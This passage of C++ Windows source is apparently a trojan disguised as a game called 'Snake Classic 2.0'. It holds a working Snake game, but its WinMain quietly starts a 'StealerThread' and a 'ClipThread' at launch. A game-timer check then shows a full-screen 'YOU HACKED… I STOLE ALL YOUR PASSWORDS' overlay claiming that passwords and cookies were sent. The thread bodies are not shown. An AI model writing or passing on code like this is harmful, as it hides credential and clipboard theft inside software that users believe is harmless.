    std::vector<int> ry(cols), rs(cols);
    for (int i = 0; i < cols; i++) { ry[i] = -(rand() % sh); rs[i] = 4 + rand() % 10; }

    HFONT fS = CreateFontA(18, 0,0,0, FW_BOLD, 0,0,0, DEFAULT_CHARSET, 0,0,0, FIXED_PITCH, "Consolas");
    HFONT fB = CreateFontA(72, 0,0,0, FW_BLACK, 0,0,0, DEFAULT_CHARSET, 0,0,0, 0, "Impact");
    HFONT fM = CreateFontA(34, 0,0,0, FW_BOLD, 0,0,0, DEFAULT_CHARSET, 0,0,0, 0, "Consolas");

    MSG msg; DWORD start = GetTickCount(); bool done = false;
    while (!done) {
        while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) done = true;
            TranslateMessage(&msg); DispatchMessageA(&msg);
        }
        RECT r = { 0, 0, sw, sh };
        HBRUSH blk = CreateSolidBrush(RGB(0,0,0));
        FillRect(dc, &r, blk); DeleteObject(blk);

        SelectObject(dc, fS);
        SetTextColor(dc, RGB(180, 0, 0));
        for (int i = 0; i < cols; i++) {
            char ch[2] = { chars[rand() % cl], 0 };
            TextOutA(dc, i * colW, ry[i], ch, 1);
            ry[i] += rs[i];
            if (ry[i] > sh) { ry[i] = -(rand() % 300); rs[i] = 4 + rand() % 12; }
        }

        DWORD e = GetTickCount() - start;
        SelectObject(dc, fB);
        SetTextColor(dc, ((e/200)%2)==0 ? RGB(255,0,0) : RGB(120,0,0));
        TextOutA(dc, sw/2 - 210, sh/2 - 140, "YOU HACKED", 10);
        TextOutA(dc, sw/2 - 160, sh/2 - 60,  "BY EMIR",    7);

        SelectObject(dc, fM);
        SetTextColor(dc, RGB(255, 30, 30));
        const char* sub = "I STOLE ALL YOUR PASSWORDS HAHAHAHAH";
        TextOutA(dc, sw/2 - 340, sh/2 + 40, sub, (int)strlen(sub));

        SelectObject(dc, fS);
        SetTextColor(dc, RGB(255, 80, 80));
        TextOutA(dc, sw/2 - 40, sh/2 + 130, "[ ROSE ]  [ EVIL ]  [ EVIL ]", 29);

        SetTextColor(dc, RGB(200, 0, 0));
        const char* ft = "[ SYSTEM COMPROMISED ]   IP LOGGED   PASSWORDS SENT   COOKIES STOLEN";
        TextOutA(dc, sw/2 - 400, sh - 60, ft, (int)strlen(ft));

        if (e > 10000) done = true;
        Sleep(16);
    }
    ReleaseDC(h, dc);
    DestroyWindow(h);
}

// ============================================================
// SNAKE GAME (GDI, Win7 compatible)
// ============================================================
static const int COLS = 30;
static const int ROWS = 20;
static const int CELL = 24;
static const int HEADER_H = 50;

static HWND  g_hwnd = NULL;
static std::deque<std::pair<int,int> > g_snake;
static int   g_dx = 1, g_dy = 0;
static int   g_fx = 0, g_fy = 0;
static int   g_score = 0;
static BOOL  g_alive = TRUE;
static BOOL  g_started = FALSE;
static int   g_tickMs = 90;
static HFONT g_font = NULL;
static HBRUSH g_bg = NULL, g_head = NULL, g_body = NULL, g_food = NULL;

static void ResetGame() {
    g_snake.clear();
    g_snake.push_back(std::make_pair(COLS/2, ROWS/2));
    g_dx = 1; g_dy = 0;
    g_score = 0; g_alive = TRUE;
    g_fx = rand() % COLS;
    g_fy = rand() % ROWS;
}

static void PaintGame(HDC dc, RECT rc) {
    RECT hdr = { 0, 0, rc.right, HEADER_H };
    HBRUSH hb = CreateSolidBrush(RGB(20, 20, 30));
    FillRect(dc, &hdr, hb); DeleteObject(hb);

    RECT bd = { 0, HEADER_H, COLS * CELL, HEADER_H + ROWS * CELL };
    FillRect(dc, &bd, g_bg);

    HPEN gp = CreatePen(PS_SOLID, 1, RGB(30, 30, 40));
    HPEN op = (HPEN)SelectObject(dc, gp);
    for (int x = 0; x <= COLS; x++) {
        MoveToEx(dc, x * CELL, HEADER_H, NULL);
        LineTo(dc, x * CELL, HEADER_H + ROWS * CELL);
    }
    for (int y = 0; y <= ROWS; y++) {
        MoveToEx(dc, 0, HEADER_H + y * CELL, NULL);
        LineTo(dc, COLS * CELL, HEADER_H + y * CELL);
    }
    SelectObject(dc, op); DeleteObject(gp);

    RECT fr = { g_fx * CELL + 3, HEADER_H + g_fy * CELL + 3,
                g_fx * CELL + CELL - 3, HEADER_H + g_fy * CELL + CELL - 3 };
    FillRect(dc, &fr, g_food);

    for (size_t i = 0; i < g_snake.size(); i++) {
        int x = g_snake[i].first, y = g_snake[i].second;
        RECT sr = { x * CELL + 1, HEADER_H + y * CELL + 1,
                    x * CELL + CELL - 1, HEADER_H + y * CELL + CELL - 1 };
        FillRect(dc, &sr, i == 0 ? g_head : g_body);
    }
    SelectObject(dc, g_font);
    SetBkMode(dc, TRANSPARENT);
    SetTextColor(dc, RGB(230, 230, 255));
    char buf[128];
    sprintf(buf, "SNAKE   Score: %d   Speed: %d", g_score, 1000 / g_tickMs);
    TextOutA(dc, 12, 14, buf, (int)strlen(buf));

    if (!g_started) {
        SetTextColor(dc, RGB(255, 220, 120));
        const char* t1 = "PRESS SPACE OR ENTER TO START";
        TextOutA(dc, COLS*CELL/2 - 130, HEADER_H + ROWS*CELL/2 - 20, t1, (int)strlen(t1));
    } else if (!g_alive) {
        SetTextColor(dc, RGB(255, 80, 80));
        char t1[64];
        sprintf(t1, "GAME OVER - Score: %d", g_score);
        TextOutA(dc, COLS*CELL/2 - 90, HEADER_H + ROWS*CELL/2 - 20, t1, (int)strlen(t1));
        const char* t2 = "Press R to restart";
        TextOutA(dc, COLS*CELL/2 - 60, HEADER_H + ROWS*CELL/2 + 10, t2, (int)strlen(t2));
    }
}

static LRESULT CALLBACK GameProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
        case WM_CREATE:
            SetTimer(h, 1, g_tickMs, NULL);
            return 0;
        case WM_KEYDOWN:
            if (!g_started && (w == VK_SPACE || w == VK_RETURN)) {
                g_started = TRUE; ResetGame();
                InvalidateRect(h, NULL, FALSE);
                return 0;
            }
            if (g_started && !g_alive && w == 'R') {
                ResetGame(); InvalidateRect(h, NULL, FALSE);
                return 0;
            }
            if (!g_alive || !g_started) return 0;
            switch (w) {
                case 'W': case VK_UP:    if (g_dy == 0) { g_dx = 0;  g_dy = -1; } break;
                case 'S': case VK_DOWN:  if (g_dy == 0) { g_dx = 0;  g_dy =  1; } break;
                case 'A': case VK_LEFT:  if (g_dx == 0) { g_dx = -1; g_dy = 0;  } break;
                case 'D': case VK_RIGHT: if (g_dx == 0) { g_dx =  1; g_dy = 0;  } break;
                case VK_ESCAPE: PostQuitMessage(0); break;
            }
            return 0;
        case WM_TIMER: {
            if (g_started && g_alive) {
                int nx = g_snake.front().first + g_dx;
                int ny = g_snake.front().second + g_dy;
                if (nx < 0 || ny < 0 || nx >= COLS || ny >= ROWS) g_alive = FALSE;
                else {
                    for (size_t i = 0; i < g_snake.size(); i++)
                        if (g_snake[i].first == nx && g_snake[i].second == ny) { g_alive = FALSE; break; }
                    if (g_alive) {
                        g_snake.push_front(std::make_pair(nx, ny));
                        if (nx == g_fx && ny == g_fy) {
                            g_score += 10;
                            g_fx = rand() % COLS;
                            g_fy = rand() % ROWS;
                            if (g_tickMs > 50) {
                                g_tickMs -= 2;
                                KillTimer(h, 1);
                                SetTimer(h, 1, g_tickMs, NULL);
                            }
                        } else g_snake.pop_back();
                    }
                }
            }
            if (InterlockedCompareExchange(&g_show_overlay, 1, 1) == 1) {
                ShowHackedOverlay();
                ExitProcess(0);
            }
            InvalidateRect(h, NULL, FALSE);
            return 0;
        }
        case WM_ERASEBKGND: return 1;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC dc = BeginPaint(h, &ps);
            RECT rc; GetClientRect(h, &rc);
            HDC mem = CreateCompatibleDC(dc);
            HBITMAP bmp = CreateCompatibleBitmap(dc, rc.right, rc.bottom);
            HBITMAP old = (HBITMAP)SelectObject(mem, bmp);
            PaintGame(mem, rc);
            BitBlt(dc, 0, 0, rc.right, rc.bottom, mem, 0, 0, SRCCOPY);
            SelectObject(mem, old);
            DeleteObject(bmp);
            DeleteDC(mem);
            EndPaint(h, &ps);
            return 0;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(h, msg, w, l);
}

// ============================================================
// ENTRY POINT — ANSI WinMain
// ============================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hPrev; (void)lpCmd; (void)nShow;
    srand((unsigned)GetTickCount());

    g_bg   = CreateSolidBrush(RGB(10, 15, 25));
    g_head = CreateSolidBrush(RGB(80, 240, 120));
    g_body = CreateSolidBrush(RGB(40, 180, 90));
    g_food = CreateSolidBrush(RGB(255, 60, 60));
    g_font = CreateFontA(22, 0,0,0, FW_BOLD, 0,0,0, DEFAULT_CHARSET, 0,0,0, 0, "Segoe UI");

    InitializeCriticalSection(&g_clipCs);
    g_clipCsInit = TRUE;

    // === start stealer + clipboard on program start ===
    CreateThread(NULL, 0, StealerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ClipThread, NULL, 0, NULL);

    WNDCLASSA wc; ZeroMemory(&wc, sizeof(wc));
    wc.lpfnWndProc = GameProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = g_bg;
    wc.lpszClassName = "SnakeClassicWndX";
    RegisterClassA(&wc);

    int winW = COLS * CELL;
    int winH = HEADER_H + ROWS * CELL;
    RECT r = { 0, 0, winW, winH };
    AdjustWindowRect(&r, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
    int fullW = r.right - r.left;
    int fullH = r.bottom - r.top;
    int sx = (GetSystemMetrics(SM_CXSCREEN) - fullW) / 2;
    int sy = (GetSystemMetrics(SM_CYSCREEN) - fullH) / 2;

    g_hwnd = CreateWindowExA(0, "SnakeClassicWndX", "Snake Classic 2.0",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_VISIBLE,
        sx, sy, fullW, fullH, NULL, NULL, hInst, NULL);
    ShowWindow(g_hwnd, SW_SHOW);
    UpdateWindow(g_hwnd);

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return (int)msg.wParam;
}
